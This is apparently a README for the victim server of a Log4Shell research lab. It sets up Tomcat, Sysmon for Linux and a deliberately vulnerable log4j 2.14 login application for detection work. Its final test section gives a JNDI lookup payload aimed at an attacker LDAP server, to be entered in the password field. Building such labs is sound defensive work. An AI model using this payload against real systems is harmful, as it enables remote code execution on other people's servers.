# Victim Server

There are several lab environments being shared in the Infosec community that are helping security researchers to test and learn more about `Log4Shell`.
However, most of them use docker containers to not only deploy the vulnerable application, but also containerize the execution of code.
From a Linux perspective, this does not help while using tools such as "[Sysmon for Linux](https://github.com/Sysinternals/SysmonForLinux)" since it cannot be installed in containers yet.
I wanted to put together a research lab where I could replicate a basic real scenario with a vulnerable Web application and Sysmon for Linux running.
## Basic Setup

* [Tomcat v8.5.3](https://tomcat.apache.org/)
* Vulnerable Java Application:
    * [javax.servlet-api v4.0.1](https://mvnrepository.com/artifact/javax.servlet/javax.servlet-api/4.0.1)
    * [log4j-core v2.14](https://mvnrepository.com/artifact/org.apache.logging.log4j/log4j-core/2.14.0)
    * [log4j-api v2.14](https://mvnrepository.com/artifact/org.apache.logging.log4j/log4j-api/2.14.0)
* [Sysmon for Linux](https://github.com/Sysinternals/SysmonForLinux)

## Set up Tomcat Server

SSH to your Linux VM and git clone this projet:

```bash
sudo su

git clone https://github.com/Cyb3rWard0g/log4jshell-lab
```
run the bash script `Install-Tomcat.sh` to install and set up a [Tomcat](https://tomcat.apache.org/) server:

```Bash
cd log4jshell-lab/victim-server/

sh Install-Tomcat.sh
```

Check if the `Tomcat` service is running properly.

```
service tomcat status
```

## Install Sysmon for Linux

Download the following Sysmon for Linux bash script to automate the installation and configuration:

```bash
wget https://raw.githubusercontent.com/OTRF/Blacksmith/master/resources/scripts/bash/Install-Sysmon-For-Linux.sh
chmod +x Install-Sysmon-For-Linux.sh

sh Install-Sysmon-For-Linux.sh --config https://raw.githubusercontent.com/OTRF/Blacksmith/master/resources/configs/sysmon/linux/sysmon.xml
```

## Install Docker

We are going to use a Docker image to compile our vulnerable application. You can use this script to install the latest Docker app in your Linux VM.

```bash
wget https://raw.githubusercontent.com/OTRF/Blacksmith/master/resources/scripts/bash/Install-Docker.sh
chmod +x Install-Docker.sh

./Install-Docker.sh
```

## Compile Vulnerable Application

We want to create a `.war` file to host the vulnerable aplication in our Tomcat server.

```bash
cd httpLoginForm/
docker run -it --rm -v "$(pwd)":/opt/maven -w /opt/maven maven mvn clean install
```

Copy `.war` file from the `target` folder to the Tomcat `/opt/tomcat/webapps/` folder.

```bash
cp target/VulnWebApp-1.0-SNAPSHOT.war /opt/tomcat/webapps/
```

## Finish Setup

### Restart Tomcat Service

```Bash
service tomcat stop
service tomcat start
```

### Access Vulnerable Web App

* You can simply browse to `http://localhost:8080/VulnWebApp-1.0-SNAPSHOT/` if your Linux VM has a GUI.
* If your Linux VM does not have a GUI and you can only use the terminal, you can SSH tunnel your access to your vulnerable application:

```bash
ssh -L 8080:127.0.0.1:8080 wardog@1.2.3.4
```

![](../resources/images/log4jshell-lab-vuln-webapp.png)

## Basic Test

If you have an "`attacker`" server up and running, simply craft your `JNDI Lookup` string and use it in the `password` field of the application `login form` hosted by your vulnerable application in your Tomcat server.

**Example:** `${jndi:ldap://192.168.2.6:1389/Run}`

## Reference
* https://linuxize.com/post/how-to-install-tomcat-8-5-on-ubuntu-18-04/
* https://www.digitalocean.com/community/tutorials/install-tomcat-9-ubuntu-1804